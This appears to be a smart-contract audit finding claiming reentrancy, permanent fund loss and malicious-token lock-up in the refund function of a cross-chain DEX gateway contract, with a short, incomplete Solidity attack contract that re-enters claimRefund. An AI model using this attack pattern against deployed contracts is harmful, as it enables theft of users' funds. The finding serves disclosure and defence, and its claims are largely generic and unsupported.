# Vulnerable Refund System with Multiple Attack Vectors

### Summary

The refund mechanism has multiple vulnerabilities including reentrancy, permanent fund loss through deletion, and potential lock-up through malicious tokens.

### Root Cause

https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex/blob/main/omni-chain-contracts/contracts/GatewayCrossChain.sol#L570C1-L590C6

### Internal Pre-conditions

- Valid externalId exists
- RefundInfo stored
- Caller has permission
- Funds available for refund

### External Pre-conditions

- Token contract is active
- Receiver can accept transfers
- No blacklisting on token
- Gas available for transaction


### Attack Path

```solidity
contract RefundAttack {
    GatewayCrossChain target;
    bytes32 public externalId;
    
    function attack() external {
        // Step 1: Create malicious token
        MaliciousToken token = new MaliciousToken();
        
        // Step 2: Setup refund info with malicious token
        setupRefundInfo(address(token));
        
        // Step 3: Execute reentrancy attack
        target.claimRefund(externalId);
    }
    
    function onTokenTransfer() external {
        // Step 4: Reenter claimRefund
        if (canReenter) {
            target.claimRefund(externalId);
        }
    }
}
```

### Impact

1. Multiple refund claims possible
2. Permanent loss of funds
3. Locked refunds
4. DOS through malicious tokens
5. Trust loss in protocol
